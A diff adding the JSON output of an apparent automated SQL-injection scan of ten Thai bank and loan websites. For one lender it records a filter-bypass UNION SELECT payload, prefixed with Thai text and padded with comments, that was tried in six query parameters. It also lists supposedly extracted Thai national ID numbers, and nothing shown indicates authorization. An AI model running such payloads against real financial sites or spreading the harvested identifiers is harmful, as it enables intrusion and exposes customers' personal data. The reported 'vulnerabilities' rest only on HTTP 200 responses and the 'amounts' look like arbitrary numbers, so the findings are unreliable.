@@ -1,0 +1,141 @@
+{
+  "scan_time": "2025-10-29T07:58:47.666254",
+  "targets_scanned": 10,
+  "total_vulnerabilities": 6,
+  "total_data_extracted": 1,
+  "results": [
+    {
+      "url": "https://www.kbank.co.th",
+      "timestamp": "2025-10-29T07:57:28.104593",
+      "vulnerabilities": [],
+      "data": [],
+      "error": "HTTPSConnectionPool(host='www.kbank.co.th', port=443): Max retries exceeded with url: / (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000002026D49D250>: Failed to resolve 'www.kbank.co.th' ([Errno 11001] getaddrinfo failed)\"))"
+    },
+    {
+      "url": "https://www.scb.co.th",
+      "timestamp": "2025-10-29T07:57:32.112964",
+      "vulnerabilities": [],
+      "data": []
+    },
+    {
+      "url": "https://www.krungsri.com",
+      "timestamp": "2025-10-29T07:57:37.165257",
+      "vulnerabilities": [],
+      "data": []
+    },
+    {
+      "url": "https://www.ktc.co.th",
+      "timestamp": "2025-10-29T07:57:51.026888",
+      "vulnerabilities": [
+        {
+          "type": "Thai Language Bypass",
+          "parameter": "id",
+          "payload": "ทดสอบ/**/UNION/**/SELECT/**/*",
+          "url": "https://www.ktc.co.th?id=%E0%B8%97%E0%B8%94%E0%B8%AA%E0%B8%AD%E0%B8%9A/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/%2A",
+          "status": 200
+        },
+        {
+          "type": "Thai Language Bypass",
+          "parameter": "user",
+          "payload": "ทดสอบ/**/UNION/**/SELECT/**/*",
+          "url": "https://www.ktc.co.th?user=%E0%B8%97%E0%B8%94%E0%B8%AA%E0%B8%AD%E0%B8%9A/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/%2A",
+          "status": 200
+        },
+        {
+          "type": "Thai Language Bypass",
+          "parameter": "username",
+          "payload": "ทดสอบ/**/UNION/**/SELECT/**/*",
+          "url": "https://www.ktc.co.th?username=%E0%B8%97%E0%B8%94%E0%B8%AA%E0%B8%AD%E0%B8%9A/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/%2A",
+          "status": 200
+        },
+        {
+          "type": "Thai Language Bypass",
+          "parameter": "search",
+          "payload": "ทดสอบ/**/UNION/**/SELECT/**/*",
+          "url": "https://www.ktc.co.th?search=%E0%B8%97%E0%B8%94%E0%B8%AA%E0%B8%AD%E0%B8%9A/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/%2A",
+          "status": 200
+        },
+        {
+          "type": "Thai Language Bypass",
+          "parameter": "q",
+          "payload": "ทดสอบ/**/UNION/**/SELECT/**/*",
+          "url": "https://www.ktc.co.th?q=%E0%B8%97%E0%B8%94%E0%B8%AA%E0%B8%AD%E0%B8%9A/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/%2A",
+          "status": 200
+        },
+        {
+          "type": "Thai Language Bypass",
+          "parameter": "query",
+          "payload": "ทดสอบ/**/UNION/**/SELECT/**/*",
+          "url": "https://www.ktc.co.th?query=%E0%B8%97%E0%B8%94%E0%B8%AA%E0%B8%AD%E0%B8%9A/%2A%2A/UNION/%2A%2A/SELECT/%2A%2A/%2A",
+          "status": 200
+        }
+      ],
+      "data": [
+        {
+          "endpoint": "https://www.ktc.co.th",
+          "data": {
+            "thai_id": [
+              "1545258739600",
+              "1544866851472",
+              "1491904177763"
+            ],
+            "amount": [
+              "1,000",
+              "66",
+              "1000",
+              "5000",
+              "4",
+              "70",
+              "11072023",
+              "100",
+              "576",
+              "2024"
+            ]
+          },
+          "type": "Text Data"
+        }
+      ]
+    },
+    {
+      "url": "https://www.aeon.co.th",
+      "timestamp": "2025-10-29T07:58:09.495014",
+      "vulnerabilities": [],
+      "data": []
+    },
+    {
+      "url": "https://www.moneycat.co.th",
+      "timestamp": "2025-10-29T07:58:16.988430",
+      "vulnerabilities": [],
+      "data": [],
+      "error": "HTTPSConnectionPool(host='www.moneycat.co.th', port=443): Max retries exceeded with url: / (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000002026EF76F90>: Failed to resolve 'www.moneycat.co.th' ([Errno 11001] getaddrinfo failed)\"))"
+    },
+    {
+      "url": "https://www.fastmoney.co.th",
+      "timestamp": "2025-10-29T07:58:21.275928",
+      "vulnerabilities": [],
+      "data": [],
+      "error": "HTTPSConnectionPool(host='www.fastmoney.co.th', port=443): Max retries exceeded with url: / (Caused by ConnectTimeoutError(<urllib3.connection.HTTPSConnection object at 0x000002026EF95510>, 'Connection to www.fastmoney.co.th timed out. (connect timeout=10)'))"
+    },
+    {
+      "url": "https://www.easyloan.co.th",
+      "timestamp": "2025-10-29T07:58:35.092378",
+      "vulnerabilities": [],
+      "data": [],
+      "error": "HTTPSConnectionPool(host='www.easyloan.co.th', port=443): Max retries exceeded with url: / (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000002026EFA3490>: Failed to resolve 'www.easyloan.co.th' ([Errno 11001] getaddrinfo failed)\"))"
+    },
+    {
+      "url": "https://www.cashloan.co.th",
+      "timestamp": "2025-10-29T07:58:38.921072",
+      "vulnerabilities": [],
+      "data": [],
+      "error": "HTTPSConnectionPool(host='www.cashloan.co.th', port=443): Max retries exceeded with url: / (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000002026EFCFC50>: Failed to resolve 'www.cashloan.co.th' ([Errno 11001] getaddrinfo failed)\"))"
+    },
+    {
+      "url": "https://www.quickloan.co.th",
+      "timestamp": "2025-10-29T07:58:42.974729",
+      "vulnerabilities": [],
+      "data": [],
+      "error": "HTTPSConnectionPool(host='www.quickloan.co.th', port=443): Max retries exceeded with url: / (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000002026FB15890>: Failed to resolve 'www.quickloan.co.th' ([Errno 11001] getaddrinfo failed)\"))"
+    }
+  ]
+}
